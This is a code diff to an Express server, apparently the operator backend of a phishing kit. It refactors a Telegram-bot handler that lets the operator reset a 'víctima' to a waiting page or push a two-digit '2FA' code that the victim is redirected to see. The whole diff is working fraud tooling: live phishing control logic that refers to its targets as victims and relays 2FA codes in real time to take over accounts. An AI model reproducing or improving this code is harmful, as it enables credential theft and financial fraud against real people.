@@ -92,6 +92,9 @@ app.post('/enviar', async (req, res) => {
 // -----------------------------------------------------------
 //  /callback (maneja botones inline) + NUEVO: comandos de texto (/txid 22)
 // -----------------------------------------------------------
+// -----------------------------------------------------------
+//  /callback (maneja botones inline) + comandos de texto (/txid 22 o /txid reset)
+// -----------------------------------------------------------
 app.post('/callback', async (req, res) => {
   // 1. Manejo de callback de botones inline
   if (req.body.callback_query) {
@@ -115,46 +118,17 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // 2. NUEVO: Manejo de comandos de texto como /abc123xyz 22
+  // 2. Manejo de comandos de texto: /txid 22  o  /txid reset
   if (req.body.message?.text) {
     const text = req.body.message.text.trim();
 
     if (text.startsWith('/')) {
       const parts = text.slice(1).split(' ');
       const txid = parts[0];
-      const code = parts[1];
+      const comando = parts[1];
 
-      if (txid && code && /^\d{2}$/.test(code)) {
-        if (txid && parts[1] && parts[1].toLowerCase() === 'reset') {
-  if (!clientes[txid]) {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: req.body.message.chat.id,
-        text: `❌ txid ${txid} no encontrado`
-      }),
-      agent
-    });
-    return res.sendStatus(200);
-  }
-
-  clientes[txid] = { status: "esperando" };
-  guardarEstado();
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: req.body.message.chat.id,
-      text: `🔄 Reiniciado!\n\n🆔 ID: ${txid}\n\nLa víctima regresará a la página de espera.`
-    }),
-    agent
-  });
-
-  return res.sendStatus(200);
-}
-        
+      // Primero: comando RESET
+      if (comando && comando.toLowerCase() === 'reset') {
         if (!clientes[txid]) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -168,10 +142,40 @@ app.post('/callback', async (req, res) => {
           return res.sendStatus(200);
         }
 
-        // Guardamos el código y cambiamos status
+        clientes[txid] = { status: "esperando" };
+        guardarEstado();
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: req.body.message.chat.id,
+            text: `🔄 Reiniciado correctamente!\n\n🆔 ID: ${txid}\n\nLa víctima regresará a cargs.html en segundos.`
+          }),
+          agent
+        });
+
+        return res.sendStatus(200);
+      }
+
+      // Segundo: comando para código 2FA (exactamente 2 dígitos)
+      if (comando && /^\d{2}$/.test(comando)) {
+        if (!clientes[txid]) {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: req.body.message.chat.id,
+              text: `❌ Error: txid ${txid} no encontrado`
+            }),
+            agent
+          });
+          return res.sendStatus(200);
+        }
+
         clientes[txid] = {
           status: "codigo2fa",
-          code: code
+          code: comando
         };
         guardarEstado();
 
@@ -180,7 +184,7 @@ app.post('/callback', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: req.body.message.chat.id,
-            text: `✅ Código 2FA activado!\n\n🆔 ID: ${txid}\n🔢 Código: ${code}\n\nLa víctima será redirigida a la página del código en segundos.`
+            text: `✅ Código 2FA activado!\n\n🆔 ID: ${txid}\n🔢 Código: ${comando}\n\nVíctima verá el código en otro3.html (o será redirigida).`
           }),
           agent
         });
@@ -194,7 +198,7 @@ app.post('/callback', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: req.body.message.chat.id,
-          text: `⚠️ Formato incorrecto.\n\nUsa: /txid código\nEjemplo: /abc123xyz 47`
+          text: `⚠️ Formato incorrecto.\n\nComandos válidos:\n• /txid 22 → enviar código 2FA\n• /txid reset → volver a espera`
         }),
         agent
       });
